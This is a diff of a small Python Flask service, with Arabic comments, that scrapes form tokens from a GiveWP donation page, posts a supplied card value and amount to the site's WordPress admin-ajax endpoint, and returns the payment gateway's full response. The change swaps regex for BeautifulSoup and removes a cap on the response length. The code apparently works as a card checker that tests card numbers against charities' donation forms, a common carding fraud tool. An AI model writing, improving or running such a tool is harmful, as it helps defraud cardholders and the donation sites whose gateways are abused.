@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify
 import requests
-import re
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
@@ -19,18 +19,22 @@ def check():
         # 1️⃣ فتح صفحة التبرع
         page = session.get(url, timeout=10).text
 
-        # 2️⃣ استخراج tokens
-        form_id = re.search(r'name="give-form-id" value="(.*?)"', page)
-        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', page)
+        # 2️⃣ استخراج tokens باستخدام BeautifulSoup
+        soup = BeautifulSoup(page, "html.parser")
+        form_id_tag = soup.find("input", {"name": "give-form-id"})
+        form_hash_tag = soup.find("input", {"name": "give-form-hash"})
 
-        if not form_id or not form_hash:
+        if not form_id_tag or not form_hash_tag:
             return jsonify({"result": "Error: tokens not found"})
+
+        form_id = form_id_tag.get("value")
+        form_hash = form_hash_tag.get("value")
 
         # 3️⃣ تجهيز بيانات الدفع
         payload = {
             "action": "give_process_donation",
-            "give-form-id": form_id.group(1),
-            "give-form-hash": form_hash.group(1),
+            "give-form-id": form_id,
+            "give-form-hash": form_hash,
             "give-amount": amount,
             "card": card
         }
@@ -39,8 +43,8 @@ def check():
         ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
         resp = session.post(ajax_url, data=payload, timeout=10)
 
-        # 5️⃣ ارجع الرد
-        return jsonify({"result": resp.text[:500]})
+        # 5️⃣ رجع الرد كما هو من البوابة
+        return jsonify({"result": resp.text})
 
     except Exception as e:
         return jsonify({"result": f"Error: {str(e)}"})
